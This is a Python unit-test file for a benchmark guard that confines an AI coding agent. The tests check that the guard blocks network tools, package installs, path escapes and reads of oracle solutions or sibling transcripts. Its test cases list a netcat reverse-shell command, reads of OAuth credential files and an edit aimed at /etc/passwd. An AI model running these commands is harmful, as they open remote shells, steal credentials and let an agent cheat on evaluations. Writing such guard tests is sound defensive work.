#!/usr/bin/env python3
"""Unit tests for security/benchmark_guard.ts enforcing quarantine and parity."""

import json
import os
import subprocess
import sys
import tempfile
import unittest

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, BASE_DIR)
GUARD_TS = os.path.join(BASE_DIR, "security", "benchmark_guard.ts")

class BenchmarkGuardTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.bun = subprocess.run(["which", "bun"], capture_output=True, text=True).stdout.strip()
        if not cls.bun:
            cls.bun = subprocess.run(["which", "node"], capture_output=True, text=True).stdout.strip()
        if not cls.bun:
            raise RuntimeError("Neither bun nor node found in PATH")

    def run_guard_probe(self, tool: str, tool_input: dict, env_overrides: dict) -> dict:
        """Run a probe against benchmark_guard.ts functions in a subprocess."""
        runner_js = f"""
import {{ inspectBash, inspectPathTool, forbiddenTargetReason }} from "{GUARD_TS}";

const tool = process.env.PROBE_TOOL;
const input = JSON.parse(process.env.PROBE_INPUT || "{{}}");

let decision;
if (tool === "bash") {{
  decision = inspectBash(input);
}} else {{
  decision = inspectPathTool(tool, input);
}}

console.log(JSON.stringify(decision || {{ ok: true }}));
"""
        env = os.environ.copy()
        env.update(env_overrides)
        env["PROBE_TOOL"] = tool
        env["PROBE_INPUT"] = json.dumps(tool_input)

        res = subprocess.run([self.bun, "-e", runner_js], env=env, capture_output=True, text=True)
        if res.returncode != 0:
            raise RuntimeError(f"Guard probe runner crashed ({res.returncode}):\n{res.stderr}\n{res.stdout}")
        return json.loads(res.stdout.strip())

    def test_benign_bash_commands_are_allowed(self):
        with tempfile.TemporaryDirectory() as ws, tempfile.TemporaryDirectory() as scratch:
            env = {
                "BENCHMARK_WORKSPACE": ws,
                "BENCHMARK_SCRATCH_DIR": scratch,
                "PROJECT_ROOT": BASE_DIR,
            }
            benign_cmds = [
                "echo 'hello' > $TMPDIR/test1.txt\ngrep 'hello' $TMPDIR/test1.txt\nrm $TMPDIR/test1.txt",
                "grep 'hello' /dev/null",
                "grep -v 'hello' /dev/null",
                "python3 -c 'import subprocess; p = subprocess.run([\"grep\", \"hello\", \"/dev/null\"]); print(p)'",
                "ls /usr/bin/grep",
                "#!/usr/bin/env python3",
                "man grep > /dev/null",
                "python3 grep.py -l hello file.txt",
                "cat << 'EOF' > scratch.py\nprint(1)\nEOF",
                "python3 -c 'a = 5 // 2'",
                "python3 -c \"print('foldl:', (5 // 2) // 5)\"",
                "python3 -c \"assert foldl(...) == n * (n - 1) // 2\"",
                "python3 -c 'x = 10 // 3 # test //: comment'",
                "python3 -c 'y = (10 // 2)'",
                "python3 -c 'z = foo(10 // 2, 3)'",
            ]
            for cmd in benign_cmds:
                dec = self.run_guard_probe("bash", {"command": cmd}, env)
                self.assertTrue(dec.get("ok"), f"False positive block on benign command: {cmd}\nGot: {dec}")
    def test_bash_network_and_package_commands_are_blocked(self):
        with tempfile.TemporaryDirectory() as ws:
            env = {"BENCHMARK_WORKSPACE": ws, "PROJECT_ROOT": BASE_DIR}
            blocked_cmds = [
                ("curl https://api.x.ai", "blocked network command"),
                ("wget http://example.com/test.py", "blocked network command"),
                ("nc -l 8080", "blocked network command"),
                ("ncat -e /bin/sh 10.0.0.1 443", "blocked network command"),
                ("netcat api.x.ai 443", "blocked network command"),
                ("socat TCP:1.1.1.1:80 -", "blocked network command"),
                ("X=$(curl host/path)", "blocked network command"),
                ("git clone https://github.com/example/repo", "blocked git network command"),
                ("git pull origin main", "blocked git network command"),
                ("pip install requests", "blocked package install"),
                ("npm install express", "blocked package install"),
                ("python3 -c 'import urllib.request; urllib.request.urlopen(\"http://x.ai\")'", "blocked network import"),
                ("python3 -c 'import requests; requests.get(\"http://x.ai\")'", "blocked network import"),
            ]
            for cmd, expected_reason in blocked_cmds:
                dec = self.run_guard_probe("bash", {"command": cmd}, env)
                self.assertTrue(dec.get("block"), f"Missed block on: {cmd}")
                self.assertIn(expected_reason, dec.get("reason", ""))
    def test_bash_quarantined_paths_are_blocked(self):
        with tempfile.TemporaryDirectory() as ws, tempfile.TemporaryDirectory() as scratch:
            env = {
                "BENCHMARK_WORKSPACE": ws,
                "BENCHMARK_SCRATCH_DIR": scratch,
                "PROJECT_ROOT": BASE_DIR,
            }
            blocked_paths = [
                f"cat {BASE_DIR}/../../benchmarks/aider-python/oracle/solutions/wordy.py",
                f"cat {BASE_DIR}/../../benchmarks/aider-python/tasks/grep/grep.py",
                f"cat {BASE_DIR}/PROTOCOL.md",
                "cat ~/.omp/config.json",
                "cat ~/.codex/auth.json",
                "cat ~/.gemini/oauth_creds.json",
                "cat $HOME/.codex/auth.json",
                "cat ${HOME}/.gemini/oauth_creds.json",
                "cat /tmp/leak.txt",
                "cat /tmp/probe_leak_dir/session.jsonl",
                "cat //tmp/leak.txt",
                "ls /tmp",
                # D1 (confirmatory-010): exact Arm A grep scratch-to-/tmp command.
                "echo \"hello\" > /tmp/test_grep.txt",
                "echo \"hello\" > /tmp/test_grep.txt; grep -l \"hello\" /tmp/test_grep.txt; rm /tmp/test_grep.txt",
            ]
            for cmd in blocked_paths:
                dec = self.run_guard_probe("bash", {"command": cmd}, env)
                self.assertTrue(dec.get("block"), f"Missed block on quarantined target: {cmd}")

    def test_path_tools_enforce_workspace_confinement(self):
        with tempfile.TemporaryDirectory() as ws, tempfile.TemporaryDirectory() as scratch:
            env = {
                "BENCHMARK_WORKSPACE": ws,
                "BENCHMARK_SCRATCH_DIR": scratch,
                "PROJECT_ROOT": BASE_DIR,
            }
            # Reading inside workspace is allowed
            dec = self.run_guard_probe("read", {"path": os.path.join(ws, "grep.py")}, env)
            self.assertTrue(dec.get("ok"))

            # Reading scratch file is allowed
            dec = self.run_guard_probe("read", {"path": os.path.join(scratch, "temp.txt")}, env)
            self.assertTrue(dec.get("ok"))

            # Reading oracle solution is blocked
            dec = self.run_guard_probe("read", {"path": f"{BASE_DIR}/../../benchmarks/aider-python/oracle/solutions/wordy.py"}, env)
            self.assertTrue(dec.get("block"))
            self.assertIn("quarantined benchmark directory", dec.get("reason", ""))

            # Reading repository file outside workspace is blocked
            dec = self.run_guard_probe("read", {"path": f"{BASE_DIR}/PROTOCOL.md"}, env)
            self.assertTrue(dec.get("block"))
            self.assertIn("project repository outside benchmark workspace", dec.get("reason", ""))

            # Foreign URIs are blocked
            for uri in ["skill://deep-research", "artifact://42", "history://session"]:
                dec = self.run_guard_probe("read", {"path": uri}, env)
                self.assertTrue(dec.get("block"), f"Missed block on foreign URI: {uri}")

            # Writing outside workspace and scratch is blocked
            dec = self.run_guard_probe("write", {"path": "/etc/test_escape.txt", "content": "bad"}, env)
            self.assertTrue(dec.get("block"))

            # B1: Edit tool hashline headers out of workspace are blocked
            bad_edit_input = "[/etc/passwd#1234]\nPUT 1.=1:\n+bad"
            dec = self.run_guard_probe("edit", {"input": bad_edit_input}, env)
            self.assertTrue(dec.get("block"), "Failed to block edit targeting /etc/passwd")

            # B1: Edit tool hashline headers inside workspace are allowed
            good_edit_input = "[grep.py#1234]\nPUT 1.=1:\n+# good"
            dec = self.run_guard_probe("edit", {"input": good_edit_input}, env)
            self.assertTrue(dec.get("ok"), "Failed to allow edit targeting grep.py inside workspace")

            # B1: Edit tool MV out of workspace is blocked
            bad_mv_input = "[grep.py#1234]\nMV /tmp/escape.py"
            dec = self.run_guard_probe("edit", {"input": bad_mv_input}, env)
            self.assertTrue(dec.get("block"), "Failed to block edit with MV out of workspace")

            # B2: Positive read confinement blocks reading sibling temporary workspaces
            with tempfile.TemporaryDirectory(prefix="sibling_workspace_") as sibling_ws:
                secret_file = os.path.join(sibling_ws, "solution.py")
                with open(secret_file, "w") as f:
                    f.write("secret")
                dec = self.run_guard_probe("read", {"path": secret_file}, env)
                self.assertTrue(dec.get("block"), "Failed to block reading sibling temporary workspace")
                self.assertIn("path outside benchmark workspace", dec.get("reason", ""))

            # B2: Safe OS system prefix read is allowed
            dec = self.run_guard_probe("read", {"path": "/usr/bin/python3"}, env)
            self.assertTrue(dec.get("ok"), "Failed to allow reading /usr/bin/python3")

    def test_bash_positive_confinement_blocks_sibling_runtime_dirs(self):
        with tempfile.TemporaryDirectory() as ws, tempfile.TemporaryDirectory() as scratch:
            env = {
                "BENCHMARK_WORKSPACE": ws,
                "BENCHMARK_SCRATCH_DIR": scratch,
                "PROJECT_ROOT": BASE_DIR,
                "TMPDIR": scratch,
            }
            with tempfile.TemporaryDirectory(prefix="harness_runtime_wordy_arm_a_") as sibling_rt:
                session_file = os.path.join(sibling_rt, "session.jsonl")
                with open(session_file, "w") as f:
                    f.write('{"solution": "wordy"}')

                dec = self.run_guard_probe("bash", {"command": f"cat {session_file}"}, env)
                self.assertTrue(dec.get("block"), "Failed to block bash reading sibling harness_runtime transcript")
                self.assertIn("path outside benchmark workspace", dec.get("reason", ""))

            scratch_file = os.path.join(scratch, "scratch.txt")
            with open(scratch_file, "w") as f:
                f.write("scratch")
            dec = self.run_guard_probe("bash", {"command": f"cat $TMPDIR/scratch.txt"}, env)
            self.assertTrue(dec.get("ok"), "Failed to allow bash reading $TMPDIR scratch file")

    def test_run_evaluation_dry_run_leaves_zero_temp_dirs(self):
        import glob
        from run_task import run_evaluation
        runs = sorted(glob.glob(os.path.join(BASE_DIR, "runs", "confirmatory-*", "run_manifest.json")))
        manifest_path = runs[-1]
        results_dir = os.path.join(os.path.dirname(manifest_path), "results")

        tmp = tempfile.gettempdir()
        before_eval = set(os.listdir(tmp))
        res = run_evaluation("wordy", "arm_a", results_dir, manifest_path, dry_run=True)
        self.assertTrue(res.get("dry_run"))
        after_eval = set(os.listdir(tmp))
        new_dirs = [d for d in after_eval - before_eval if d.startswith("harness_")]
        self.assertEqual(len(new_dirs), 0, f"run_evaluation dry-run leaked temp directories: {new_dirs}")

    def test_stage_runners_early_exit_and_signatures(self):
        import time
        from arm_a_omp import run_omp_stage
        from arm_b_multicli import run_cli_stage

        res_a = run_omp_stage(
            "1_PLANNER", "planner", "test", "/tmp", "/tmp", "/tmp", "/tmp", "/tmp/config.yml", "/tmp/guard.ts", "/tmp/guard.ndjson",
            deadline=time.monotonic() - 1, continue_session=False, scratch_dir="/tmp"
        )
        self.assertEqual(res_a["configured_model"], "xai-oauth/grok-4.6")
        self.assertEqual(res_a["error"], "TASK_TIMEOUT")

        res_b = run_cli_stage(
            "1_PLANNER", "planner", "grok", ["echo"], "/tmp", "/tmp",
            deadline=time.monotonic() - 1, env={}, scratch_dir="/tmp"
        )
        self.assertEqual(res_b["configured_model"], "grok-4.6")
        self.assertEqual(res_b["error"], "TASK_TIMEOUT")


if __name__ == "__main__":
    unittest.main()
